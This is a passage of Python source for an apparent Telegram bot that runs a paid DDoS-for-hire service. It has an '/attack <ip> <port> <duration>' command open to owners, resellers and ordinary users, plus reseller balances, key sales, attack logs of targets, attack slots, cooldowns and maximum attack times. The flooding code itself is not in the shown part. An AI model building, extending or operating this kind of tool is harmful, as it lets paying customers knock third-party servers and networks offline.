{HTML_EMOJI.STORE} <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:</b>
• /addreseller &lt;id&gt; - 𝐀𝐝𝐝 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫
• /removereseller &lt;id&gt; - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫
• /blockreseller &lt;id&gt; - 𝐁𝐥𝐨𝐜𝐤
• /unblockreseller &lt;id&gt; - 𝐔𝐧𝐛𝐥𝐨𝐜𝐤
• /allresellers - 𝐀𝐥𝐥 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬
• /saldoadd &lt;id&gt; &lt;amt&gt; - 𝐀𝐝𝐝 𝐛𝐚𝐥𝐚𝐧𝐜𝐞
• /saldoremove &lt;id&gt; &lt;amt&gt; - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐛𝐚𝐥𝐚𝐧𝐜𝐞
• /saldo &lt;id&gt; - 𝐂𝐡𝐞𝐜𝐤 𝐛𝐚𝐥𝐚𝐧𝐜𝐞

{HTML_EMOJI.USERS} <b>𝐆𝐑𝐎𝐔𝐏 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:</b>
• /addgrp &lt;name&gt; &lt;group_id&gt; &lt;days&gt; - 𝐀𝐩𝐩𝐫𝐨𝐯𝐞 𝐠𝐫𝐨𝐮𝐩
• /delgrp &lt;name&gt; - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐠𝐫𝐨𝐮𝐩 𝐚𝐩𝐩𝐫𝐨𝐯𝐚𝐥
• /grpinfo - 𝐋𝐢𝐬𝐭 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐠𝐫𝐨𝐮𝐩𝐬
• /setgrp &lt;group_id&gt; &lt;setting&gt; &lt;value&gt;

{HTML_EMOJI.CAMERA} <b>𝐏𝐇𝐎𝐓𝐎 𝐌𝐀𝐍𝐀𝐆𝐄𝐌𝐄𝐍𝐓:</b>
• /addphoto &lt;denied|attack|startsms&gt; - 𝐑𝐞𝐩𝐥𝐲 𝐭𝐨 𝐚 𝐩𝐡𝐨𝐭𝐨 𝐭𝐨 𝐬𝐚𝐯𝐞
• /removephoto &lt;denied|attack|startsms|all&gt; - 𝐑𝐞𝐦𝐨𝐯𝐞 𝐩𝐡𝐨𝐭𝐨

{HTML_EMOJI.MEGAPHONE} <b>𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓:</b>
• /broadcast - 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐚𝐥𝐥
• /broadcastreseller - 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐫𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬
• /broadcastpaid - 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐭𝐨 𝐩𝐚𝐢𝐝 𝐮𝐬𝐞𝐫𝐬 𝐨𝐧𝐥𝐲

{HTML_EMOJI.STATS} <b>𝐌𝐎𝐍𝐈𝐓𝐎𝐑𝐈𝐍𝐆:</b>
• /live - 𝐒𝐞𝐫𝐯𝐞𝐫 𝐬𝐭𝐚𝐭𝐬
• /logs - 𝐀𝐭𝐭𝐚𝐜𝐤 𝐥𝐨𝐠𝐬
• /dellogs - 𝐃𝐞𝐥𝐞𝐭𝐞 𝐚𝐥𝐥 𝐥𝐨𝐠𝐬
• /ping - 𝐒𝐡𝐨𝐰 𝐛𝐨𝐭 𝐥𝐚𝐭𝐞𝐧𝐜𝐲

{HTML_EMOJI.SETTINGS} <b>𝐌𝐀𝐈𝐍𝐓𝐄𝐍𝐀𝐍𝐂𝐄:</b>
• /maintenance &lt;msg&gt; - 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐎𝐍
• /ok - 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐎𝐅𝐅
'''

    safe_send_message(message.chat.id, help_text, reply_to=message)


# ============ HELP COMMAND ============

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id

    if is_owner(user_id):
        help_text = f'''
{HTML_EMOJI.CROWN} <b>𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐎𝐰𝐧𝐞𝐫!</b>

• 𝐔𝐬𝐞 /owner 𝐭𝐨 𝐬𝐞𝐞 𝐚𝐥𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐨𝐫 /config 𝐟𝐨𝐫 𝐢𝐧𝐭𝐞𝐫𝐚𝐜𝐭𝐢𝐯𝐞 𝐩𝐚𝐧𝐞𝐥.

{HTML_EMOJI.FIRE} <b>𝐁𝐚𝐬𝐢𝐜 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝐋𝐚𝐮𝐧𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤
{HTML_EMOJI.ARROW_RIGHT} /status - 𝐂𝐡𝐞𝐜𝐤 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐭𝐮𝐬
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝐂𝐚𝐧𝐜𝐞𝐥 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐚 𝐤𝐞𝐲
{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬
{HTML_EMOJI.ARROW_RIGHT} /id - 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐈𝐃
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝐒𝐡𝐨𝐰 𝐛𝐨𝐭 𝐥𝐚𝐭𝐞𝐧𝐜𝐲
'''
    elif is_reseller(user_id):
        help_text = f'''
{HTML_EMOJI.STORE} <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐏𝐀𝐍𝐄𝐋</b>

{HTML_EMOJI.FIRE} <b>𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝐋𝐚𝐮𝐧𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐚 𝐤𝐞𝐲
{HTML_EMOJI.ARROW_RIGHT} /status - 𝐂𝐡𝐞𝐜𝐤 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐭𝐮𝐬
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝐂𝐚𝐧𝐜𝐞𝐥 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤
{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬
{HTML_EMOJI.ARROW_RIGHT} /id - 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐈𝐃
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝐒𝐡𝐨𝐰 𝐛𝐨𝐭 𝐥𝐚𝐭𝐞𝐧𝐜𝐲
{HTML_EMOJI.ARROW_RIGHT} /mysaldo - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐛𝐚𝐥𝐚𝐧𝐜𝐞
{HTML_EMOJI.ARROW_RIGHT} /prices - 𝐕𝐢𝐞𝐰 𝐤𝐞𝐲 𝐩𝐫𝐢𝐜𝐞𝐬
{HTML_EMOJI.ARROW_RIGHT} /gen - 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐤𝐞𝐲𝐬
'''
    else:
        help_text = f'''
{HTML_EMOJI.DOCUMENT} <b>𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬:</b>

{HTML_EMOJI.ARROW_RIGHT} /start - 𝐒𝐭𝐚𝐫𝐭 𝐢𝐧𝐭𝐞𝐫𝐚𝐜𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 𝐭𝐡𝐞 𝐛𝐨𝐭
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝐋𝐚𝐮𝐧𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐚 𝐤𝐞𝐲
{HTML_EMOJI.ARROW_RIGHT} /status - 𝐂𝐡𝐞𝐜𝐤 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐭𝐮𝐬
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝐂𝐚𝐧𝐜𝐞𝐥 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤
{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬
{HTML_EMOJI.ARROW_RIGHT} /id - 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐈𝐃
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝐒𝐡𝐨𝐰 𝐛𝐨𝐭 𝐥𝐚𝐭𝐞𝐧𝐜𝐲

{HTML_EMOJI.CAMERA} 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝: 𝐀𝐟𝐭𝐞𝐫 𝐞𝐚𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤, 𝐲𝐨𝐮 𝐦𝐮𝐬𝐭 𝐬𝐞𝐧𝐝 𝐚 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞.
'''

    safe_send_message(message.chat.id, help_text, reply_to=message)


# ============ START COMMAND ============

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name

    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return

    if is_owner(user_id):
        response = f'''{HTML_EMOJI.CROWN} <b>𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐎𝐰𝐧𝐞𝐫, {user_name}!</b>

• 𝐔𝐬𝐞 /owner 𝐭𝐨 𝐬𝐞𝐞 𝐚𝐥𝐥 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐨𝐫 /config 𝐟𝐨𝐫 𝐢𝐧𝐭𝐞𝐫𝐚𝐜𝐭𝐢𝐯𝐞 𝐩𝐚𝐧𝐞𝐥.
• 𝐔𝐬𝐞 /help 𝐭𝐨 𝐬𝐞𝐞 𝐛𝐚𝐬𝐢𝐜 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬.'''
    elif is_reseller(user_id):
        response = f'''{HTML_EMOJI.STORE} <b>𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫, {user_name}!</b>

• 𝐔𝐬𝐞 /help 𝐭𝐨 𝐬𝐞𝐞 𝐲𝐨𝐮𝐫 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬.'''
    else:
        response = f'''{HTML_EMOJI.WAVE} <b>𝐖𝐞𝐥𝐜𝐨𝐦𝐞, {user_name}!</b>

{HTML_EMOJI.FIRE} <b>𝐇𝐞𝐫𝐞 𝐚𝐫𝐞 𝐭𝐡𝐞 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐲𝐨𝐮 𝐜𝐚𝐧 𝐮𝐬𝐞:</b>

{HTML_EMOJI.ARROW_RIGHT} /start - 𝐒𝐭𝐚𝐫𝐭 𝐢𝐧𝐭𝐞𝐫𝐚𝐜𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 𝐭𝐡𝐞 𝐛𝐨𝐭.
{HTML_EMOJI.ARROW_RIGHT} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - 𝐋𝐚𝐮𝐧𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤.
{HTML_EMOJI.ARROW_RIGHT} /redeem &lt;key&gt; - 𝐑𝐞𝐝𝐞𝐞𝐦 𝐚 𝐤𝐞𝐲.
{HTML_EMOJI.ARROW_RIGHT} /status - 𝐂𝐡𝐞𝐜𝐤 𝐚𝐭𝐭𝐚𝐜𝐤 𝐬𝐭𝐚𝐭𝐮𝐬.
{HTML_EMOJI.ARROW_RIGHT} /cancel - 𝐂𝐚𝐧𝐜𝐞𝐥 𝐚𝐜𝐭𝐢𝐯𝐞 𝐚𝐭𝐭𝐚𝐜𝐤.
{HTML_EMOJI.ARROW_RIGHT} /myaccess - 𝐂𝐡𝐞𝐜𝐤 𝐲𝐨𝐮𝐫 𝐚𝐜𝐜𝐞𝐬𝐬.
{HTML_EMOJI.ARROW_RIGHT} /id - 𝐆𝐞𝐭 𝐲𝐨𝐮𝐫 𝐈𝐃.
{HTML_EMOJI.ARROW_RIGHT} /ping - 𝐒𝐡𝐨𝐰 𝐛𝐨𝐭 𝐥𝐚𝐭𝐞𝐧𝐜𝐲

{HTML_EMOJI.CAMERA} 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝: 𝐀𝐟𝐭𝐞𝐫 𝐞𝐚𝐜𝐡 𝐚𝐭𝐭𝐚𝐜𝐤, 𝐲𝐨𝐮 𝐦𝐮𝐬𝐭 𝐬𝐞𝐧𝐝 𝐚 𝐬𝐜𝐫𝐞𝐞𝐧𝐬𝐡𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐢𝐧𝐮𝐞.
'''

    file_id = get_photo('startsms')
    if file_id:
        safe_send_photo(message.chat.id, file_id, caption=response, reply_to=message)
    else:
        safe_send_message(message.chat.id, response, reply_to=message)


# ============ LIVE STATS COMMAND ============

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()

    cpu_overall = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent

    disk = psutil.disk_usage('/')
    disk_percent = disk.percent

    import platform
    system_info = f"{platform.system()} {platform.release()}"

    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})

    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})

    total_resellers = resellers_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    total_keys = keys_collection.count_documents({})

    busy_slots, free_slots, total_slots = get_slot_status()
    active_count = len([a for a in active_attacks.values() if a['end_time'] > datetime.now()])

    maint_status = f"{HTML_EMOJI.CROSS} 𝐄𝐧𝐚𝐛𝐥𝐞𝐝" if is_maintenance() else f"{HTML_EMOJI.CHECKMARK} 𝐃𝐢𝐬𝐚𝐛𝐥𝐞𝐝"

    response = "═══════════════════════════\n"
    response += f"{HTML_EMOJI.STATS} 𝐒𝐄𝐑𝐕𝐄𝐑 𝐒𝐓𝐀𝐓𝐈𝐒𝐓𝐈𝐂𝐒\n"
    response += "═══════════════════════════\n\n"

    response += f"{HTML_EMOJI.DISCORD} <b>𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</b>\n"
    response += f"• 𝐔𝐩𝐭𝐢𝐦𝐞: {uptime_str}\n"
    response += f"• 𝐌𝐞𝐦𝐨𝐫𝐲 𝐔𝐬𝐚𝐠𝐞: {memory_mb:.1f} 𝐌𝐁\n"
    response += f"• 𝐂𝐏𝐔 𝐔𝐬𝐚𝐠𝐞: {cpu_percent:.1f}%\n"
    response += f"• 𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}\n\n"

    response += f"{HTML_EMOJI.DESKTOP} <b>𝐒𝐘𝐒𝐓𝐄𝐌 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍</b>\n"
    response += f"• 𝐒𝐲𝐬𝐭𝐞𝐦: {system_info}\n"
    response += f"• 𝐂𝐏𝐔: {cpu_overall:.1f}% 𝐨𝐯𝐞𝐫𝐚𝐥𝐥\n"
    response += f"• 𝐑𝐀𝐌: {ram_percent:.1f}% 𝐮𝐬𝐞𝐝 ({ram_used:.0f}𝐌𝐁/{ram_total:.0f}𝐌𝐁)\n"
    response += f"• 𝐃𝐢𝐬𝐤: {disk_percent:.1f}% 𝐮𝐬𝐞𝐝\n\n"

    response += f"• 𝐀𝐜𝐭𝐢𝐯𝐞 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: {active_count}/{total_slots}\n"
    response += f"• 𝐌𝐚𝐢𝐧𝐭𝐞𝐧𝐚𝐧𝐜𝐞 𝐌𝐨𝐝𝐞: {maint_status}\n\n"

    response += f"{HTML_EMOJI.STATS} <b>𝐁𝐎𝐓 𝐃𝐀𝐓𝐀</b>\n"
    response += f"• 𝐓𝐨𝐭𝐚𝐥 𝐔𝐬𝐞𝐫𝐬: {total_users}\n"
    response += f"• 𝐀𝐜𝐭𝐢𝐯𝐞 𝐔𝐬𝐞𝐫𝐬 (𝐊𝐞𝐲𝐬): {active_users}\n"
    response += f"• 𝐎𝐧𝐥𝐢𝐧𝐞 𝐔𝐬𝐞𝐫𝐬: {online_users}\n"
    response += f"• 𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫𝐬: {total_resellers}\n"
    response += f"• 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐊𝐞𝐲𝐬: {active_keys}\n"
    response += f"• 𝐓𝐨𝐭𝐚𝐥 𝐊𝐞𝐲𝐬: {total_keys}\n"
    response += f"• 𝐁𝐥𝐨𝐜𝐤𝐞𝐝 𝐈𝐏𝐬: {len(get_all_blocked_ips())}\n"
    response += f"• 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 𝐆𝐫𝐨𝐮𝐩𝐬: {approved_groups_collection.count_documents({})}\n"

    response += "\n═══════════════════════════"

    safe_send_message(message.chat.id, response, reply_to=message)


# ============ LOGS COMMAND ============

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    all_logs = list(attack_logs_collection.find().sort('timestamp', -1).limit(200))

    if not all_logs:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐨𝐠𝐬 𝐟𝐨𝐮𝐧𝐝!", reply_to=message)
        return

    content = "═══════════════════════════\n"
    content += "       𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐎𝐆𝐒 𝐑𝐄𝐏𝐎𝐑𝐓\n"
    content += f"    𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    content += f"𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 (𝐥𝐚𝐬𝐭 200): {len(all_logs)}\n\n"
    content += "───────────────────────────\n"

    for i, log in enumerate(all_logs, 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n"
        content += f"   𝐓𝐚𝐫𝐠𝐞𝐭: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        content += f"   𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   𝐓𝐢𝐦𝐞: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        content += "\n"

    content += "═══════════════════════════\n"
    content += f"𝐄𝐍𝐃 𝐎𝐅 𝐋𝐎𝐆𝐒\n"
    content += "═══════════════════════════"

    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    if bot:
        bot.send_document(message.chat.id, file, caption=f"{HTML_EMOJI.STATS} 𝐀𝐭𝐭𝐚𝐜𝐤 𝐋𝐨𝐠𝐬\n\n{HTML_EMOJI.FIRE} 𝐓𝐨𝐭𝐚𝐥 𝐀𝐭𝐭𝐚𝐜𝐤𝐬: {len(all_logs)}", parse_mode="HTML")


@bot.message_handler(commands=["dellogs"])
def delete_logs_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    count = attack_logs_collection.count_documents({})

    if count == 0:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.DOCUMENT} 𝐍𝐨 𝐥𝐨𝐠𝐬 𝐭𝐨 𝐝𝐞𝐥𝐞𝐭𝐞!", reply_to=message)
        return

    attack_logs_collection.delete_many({})

    safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>{count} 𝐚𝐭𝐭𝐚𝐜𝐤 𝐥𝐨𝐠𝐬 𝐝𝐞𝐥𝐞𝐭𝐞𝐝!</b>", reply_to=message)


# ============ MAXATTACK / COOLDOWN / SETMAXSLOT ============

@bot.message_handler(commands=["maxattack"])
def max_attack_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", reply_to=message)
        return

    command_parts = message.text.split()

    if len(command_parts) == 1:
        current = get_max_attack_time()
        safe_send_message(message.chat.id, f"{HTML_EMOJI.SETTINGS} <b>𝐂𝐮𝐫𝐫𝐞𝐧𝐭 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞:</b> {current}s\n\n𝐂𝐡𝐚𝐧𝐠𝐞: <code>/maxattack &lt;seconds&gt;</code>", reply_to=message)
        return

    try:
        new_value = int(command_parts[1])
        if new_value < MIN_ATTACK_TIME:
            safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐕𝐚𝐥𝐮𝐞 𝐦𝐮𝐬𝐭 𝐛𝐞 𝐚𝐭 𝐥𝐞𝐚𝐬𝐭 {MIN_ATTACK_TIME} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬!</b>", reply_to=message)
            return

        set_setting('max_attack_time', new_value)
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CHECKMARK} <b>𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞 𝐬𝐞𝐭:</b> {new_value}s", reply_to=message)
    except ValueError:
        safe_send_message(message.chat.id, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐧𝐮𝐦𝐛𝐞𝐫!</b>", reply_to=message)


# ============ GROUP MANAGEMENT ============

@bot.message_handler(commands=["addgrp"])
def add_group_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/addgrp &lt;name&gt; &lt;group_id&gt; &lt;days&gt;</code>\n\n𝐄𝐱𝐚𝐦𝐩𝐥𝐞: <code>/addgrp TESTGROUP -100123456789 30</code>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    name = command_parts[1]
    group_id = command_parts[2]

    try:
        days = int(command_parts[3])
        expiry_date = datetime.now() + timedelta(days=days)

        group_data = {
            'name': name,
            'group_id': group_id,
            'added_by': user_id,
            'added_at': datetime.now(),
            'expiry_date': expiry_date,
            'max_attack_time': get_max_attack_time(),
            'max_slots': current_max_slots,
            'cooldown': get_user_cooldown_setting(),
            'feedback_required': get_setting('feedback_required', True)
        }

        approved_groups_collection.update_one(
            {'group_id': group_id},
            {'$set': group_data},
            upsert=True
        )

        bot.reply_to(message, f"{HTML_EMOJI.CHECKMARK} <b>𝐆𝐫𝐨𝐮𝐩 {name} 𝐚𝐩𝐩𝐫𝐨𝐯𝐞𝐝!</b>\n\n{HTML_EMOJI.PROFILE} 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃: <code>{group_id}</code>\n{HTML_EMOJI.TIMER} 𝐕𝐚𝐥𝐢𝐝 𝐟𝐨𝐫: {days} 𝐝𝐚𝐲𝐬\n{HTML_EMOJI.CALENDAR} 𝐄𝐱𝐩𝐢𝐫𝐞𝐬: {expiry_date.strftime('%d-%m-%Y')}\n\n{HTML_EMOJI.SETTINGS} <b>𝐃𝐞𝐟𝐚𝐮𝐥𝐭 𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬:</b>\n• 𝐌𝐚𝐱 𝐀𝐭𝐭𝐚𝐜𝐤 𝐓𝐢𝐦𝐞: {group_data['max_attack_time']}s\n• 𝐌𝐚𝐱 𝐒𝐥𝐨𝐭𝐬: {group_data['max_slots']}\n• 𝐂𝐨𝐨𝐥𝐝𝐨𝐰𝐧: {group_data['cooldown']}s\n• 𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐑𝐞𝐪𝐮𝐢𝐫𝐞𝐝: {'𝐎𝐍' if group_data['feedback_required'] else '𝐎𝐅𝐅'}", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
    except:
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐝𝐚𝐲𝐬 𝐯𝐚𝐥𝐮𝐞!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)


@bot.message_handler(commands=["delgrp"])
def del_group_command(message):
    user_id = message.from_user.id

    if not is_owner(user_id):
        bot.reply_to(message, f"{HTML_EMOJI.CROSS} <b>𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐜𝐚𝐧 𝐨𝐧𝐥𝐲 𝐛𝐞 𝐮𝐬𝐞𝐝 𝐛𝐲 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫!</b>", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, f"{HTML_EMOJI.WARNING} 𝐔𝐬𝐚𝐠𝐞: <code>/delgrp &lt;name&gt;</code>\n\n𝐔𝐬𝐞 /grpinfo 𝐭𝐨 𝐬𝐞𝐞 𝐠𝐫𝐨𝐮𝐩 𝐧𝐚𝐦𝐞𝐬.", parse_mode="HTML", reply_markup=MAIN_KEYBOARD)
        return

    name = command_parts[1]

    result = approved_groups_collection.delete_one({'name': name})

    if result.deleted_count > 0:
